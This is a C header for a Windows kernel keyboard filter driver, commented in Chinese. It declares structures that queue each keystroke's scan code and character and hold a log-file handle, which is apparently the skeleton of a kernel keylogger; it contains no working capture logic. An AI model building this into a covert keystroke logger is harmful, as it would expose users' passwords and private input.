#pragma once
#include <ntddk.h>

typedef struct tagDeviceExtension
{
	PDEVICE_OBJECT pLowerDeviceObject; //用于记录低一个层次的设备对象
	PDEVICE_OBJECT pTargetDeviceObject; //用于记录低一个层次的设备对象

}DEVICEEXTENSION, *PDEVICEEXTENSION;

typedef struct tagThreadContext
{
	LIST_ENTRY keyLst;   //用于记录每一个键盘的输入数据
	KSPIN_LOCK spinLock; //自旋锁
	KSEMAPHORE semLock;  //信号灯
	int  bTerminate;     //结束标志
	PETHREAD pThreadObj; //线程句柄
	HANDLE hLogFile;     //日志文件句柄

}THREADCONTEXT, *PTHREADCONTEXT;

//KEYLST列表中的每一项
typedef struct tagKeyData
{
	LIST_ENTRY LstEntry; //链表头部   
	USHORT Flags;
	USHORT MakeCode;
	CHAR  ch;
}KEYDATA, *PKEYDATA;

extern POBJECT_TYPE *IoDriverObjectType;
extern PTHREADCONTEXT g_pThreadContext;


NTSTATUS
ObReferenceObjectByName(
	__in PUNICODE_STRING ObjectName,
	__in ULONG Attributes,
	__in_opt PACCESS_STATE AccessState,
	__in_opt ACCESS_MASK DesiredAccess,
	__in POBJECT_TYPE ObjectType,
	__in KPROCESSOR_MODE AccessMode,
	__inout_opt PVOID ParseContext,
	__out PVOID *Object
);

NTSTATUS
RtlStringCbPrintfA(
	OUT LPSTR  pszDest,
	IN size_t  cbDest,
	IN LPCSTR  pszFormat,
	...
);